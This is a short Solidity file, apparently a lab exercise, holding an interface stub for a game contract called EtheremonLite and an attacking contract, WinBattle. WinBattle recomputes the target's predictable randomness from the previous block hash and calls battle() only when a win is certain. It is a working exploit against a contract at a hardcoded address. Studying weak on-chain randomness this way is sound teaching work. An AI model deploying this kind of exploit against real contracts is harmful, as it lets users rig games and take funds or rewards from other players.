// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EtheremonLite {
    function initMonster(string memory _monsterName) public {}
    function getName(address _monsterAddress) public view returns(string memory) {}
    function getNumWins(address _monsterAddress) public view returns(uint) {}
    function getNumLosses(address _monsterAddress) public view returns(uint) {}
    function battle() public returns(bool){}
}




contract WinBattle {

    EtheremonLite public etheremonlite = EtheremonLite (address(0x04EAB7C83B2F45bDbE9DF44E337740bbdFe5efDE));

    // check to see if the challenger will win the next battle
    function determineWinner() public returns (bool) {
        // battle ratio is fixed in target contract
        uint battleRatio = 3;
        uint dice = uint(blockhash(block.number - 1));
        dice = dice / 2; // Divide the dice by 2 to add obfuscation
        if (dice % battleRatio == 0) {
            (bool success) = etheremonlite.battle();
            require(success, "External contract execution failed.");
            return true;
            
        }
        else {
            return false;
        }
    
    }

    function CreateMonster() public {
        etheremonlite.initMonster("Je354");
    }
    
    function WinCounter() public view returns(uint) {
        return etheremonlite.getNumWins(address(this));
    }

    function LossCounter() public view returns(uint) {
        return etheremonlite.getNumLosses(address(this));
    }
}